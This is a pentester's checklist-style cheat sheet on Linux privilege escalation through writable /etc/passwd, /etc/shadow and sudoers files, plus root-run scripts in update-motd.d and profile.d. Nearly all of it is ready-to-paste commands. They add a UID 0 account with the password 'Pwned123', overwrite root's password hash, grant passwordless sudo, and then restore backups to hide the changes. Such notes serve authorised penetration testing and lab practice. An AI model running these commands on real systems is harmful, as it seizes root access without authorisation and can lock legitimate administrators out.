# Linux privesc: writable system files

## Check
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d 2>/dev/null
find /etc -writable -type f 2>/dev/null
- [ ] Only a readable shadow, or a backup of one: :Pb linux-creds
- [ ] Written through a program run as root, such as sudo tee or a SUID editor: the same steps, through that program

## Writable /etc/passwd: a new root account
A hash in passwd's second field wins over shadow. Copies go to /tmp first, for putting back.
[ -e /tmp/passwd.bak ] || cp /etc/passwd /tmp/passwd.bak
echo "pe:$(openssl passwd -1 Pwned123):0:0:root:/root:/bin/bash" >> /etc/passwd
su pe
- [ ] su asks for Pwned123
- [ ] su refuses it: -6 in place of -1, for a SHA-512 hash

## Writable /etc/passwd: root's own password
sed -i needs /etc itself writable, so the change goes through a copy:
[ -e /tmp/passwd.bak ] || cp /etc/passwd /tmp/passwd.bak
sed "s|^root:x:|root:$(openssl passwd -1 Pwned123):|" /etc/passwd > /tmp/passwd.new
cat /tmp/passwd.new > /etc/passwd
su root

## Writable /etc/shadow
[ -e /tmp/shadow.bak ] || cp /etc/shadow /tmp/shadow.bak
sed "s|^root:[^:]*:|root:$(openssl passwd -6 Pwned123):|" /etc/shadow > /tmp/shadow.new
cat /tmp/shadow.new > /etc/shadow
su root
- [ ] An openssl too old for -6: mkpasswd -m sha-512 Pwned123 gives the hash instead

## Writable sudoers
echo '<Username> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
echo '<Username> ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pe
sudo -i
- [ ] The first when sudoers is writable, the second when sudoers.d is
- [ ] sudo stops at a sudoers file that anyone may write or that root does not own, so this works when I write through something run as root, not when the file is open to everyone

## Other files root trusts
- [ ] A writable service unit, timer or cron file: :Pb cron
- [ ] A writable script in /etc/update-motd.d: root runs it at every SSH login, mine included
- [ ] A writable script in /etc/profile.d: it runs as whoever logs in next, root included

## Afterwards
Each only if its copy exists, or the file is emptied:
[ -s /tmp/passwd.bak ] && cat /tmp/passwd.bak > /etc/passwd
[ -s /tmp/shadow.bak ] && cat /tmp/shadow.bak > /etc/shadow
rm -f /tmp/passwd.bak /tmp/passwd.new /tmp/shadow.bak /tmp/shadow.new
- [ ] My sudoers line taken out: a broken passwd or sudoers locks everyone out
